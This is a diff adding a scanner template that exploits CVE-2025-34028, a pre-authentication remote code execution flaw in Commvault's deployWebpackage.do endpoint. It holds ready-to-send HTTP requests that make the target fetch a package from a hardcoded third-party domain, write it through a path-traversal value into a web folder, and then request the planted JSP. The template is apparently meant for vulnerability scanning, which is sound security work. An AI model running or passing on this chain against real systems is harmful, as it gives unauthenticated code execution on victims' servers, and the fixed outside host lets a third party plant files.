@@ -1,0 +1,46 @@
+id: commvault-deploywebpackage-cve-2025-34028
+
+info:
+  name: Commvault Pre-Auth RCE via deployWebpackage.do (CVE-2025-34028)
+  author: nickaures
+  severity: critical
+  description: |
+    Commvault Innovation Release 11.38.0–11.38.19 is vulnerable to a pre-auth RCE via SSRF + Arbitrary File Write through the deployWebpackage.do endpoint.
+  reference:
+    - https://watchtowr.com/blog/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/
+    - https://documentation.commvault.com/securityadvisories/CV_2025_04_1.html
+  tags: rce,ssrf,fileupload,commvault,cve2025,preauth
+  classification:
+    cve-id: CVE-2025-34028
+
+http:
+  - raw:
+      - |
+        POST /commandcenter/deployWebpackage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+
+        commcellName={{interactsh-url}}&servicePack=../../Reports/MetricsUpload/nucleitest&version=test
+      - |
+        GET /reports/MetricsUpload/nucleitest/.tmp/dist-cc/dist-cc/nucleitest.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      interactsh-url:
+        - "e5kgvjvf0bbwzx0qhm29rn0rnit9hz5o.n0ur5sec.bugshieldlabs.com"
+
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "Server Info"
+          - "Session ID"
+        condition: and
